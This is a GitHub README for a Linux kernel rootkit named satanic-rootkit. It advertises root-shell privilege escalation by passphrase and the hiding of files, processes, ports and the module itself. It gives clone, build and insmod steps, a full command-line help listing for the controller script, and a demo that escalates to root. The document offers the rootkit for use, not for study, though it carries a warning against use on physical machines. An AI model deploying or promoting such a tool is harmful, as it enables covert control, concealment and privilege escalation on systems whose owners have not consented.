<div align="center">
  <img src="https://github.com/aesophor/satanic-rootkit/blob/master/.meta/banner.jpg">
  <b>CAUTION: Do NOT test this on physical machines!</b>
</div>

## Overview
* Local privilege escalation (grant root shell)
* File/directory hiding **by absolute path**
* Process hiding by PID
* Port hiding
* Hides the rootkit module itself
* ...

## Usage
After inserting `satan.ko` into Linux kernel, one can use `satanist.py` to command the rootkit.
```
> ./satanist.py --help                 
usage: ./satanist.py <command> [argument]

--privesc <passphrase>     -- Spawn a root shell (bash).
--file-hide <path>         -- File/directory hiding by absolute path.
--file-unhide <path>       -- File/directory unhiding by absolute path.
--proc-hide <pid>          -- Process hiding by PID.
--proc-unhide <pid>        -- Process unhiding by PID.
--port-hide <pid>          -- Port hiding by port number.
--port-unhide <pid>        -- Port unhiding by port number.
--mod-hide <pid>           -- Module hiding (hide itself from lsmod).
--mod-unhide <pid>         -- Module unhiding (unhide itself from lsmod).

-h --help                  -- Help message.
-v --version               -- Version info.
```

## Tested On
* Debian 9 stretch 4.9.0-11

## Build Requirements
* gcc
* GNU Make
* Linux headers

## Installation
1. Build kernel module.
```
$ git clone https://github.com/aesophor/satanic-rootkit.git
$ cd satanic-rootkit
$ make
```

2. Insert kernel module as root.
```
root# insmod satan.ko
```

3. Run satanist.py as normal user to command the rootkit.
```
$ ./satanist.py --help
```

4. Profit (?)
```
$ ./satanist.py --privesc 'Hail Satan!'
# whoami
root
```

## License
Available under [GPL-2.0 License](https://github.com/aesophor/satanic-rootkit/blob/master/LICENSE)
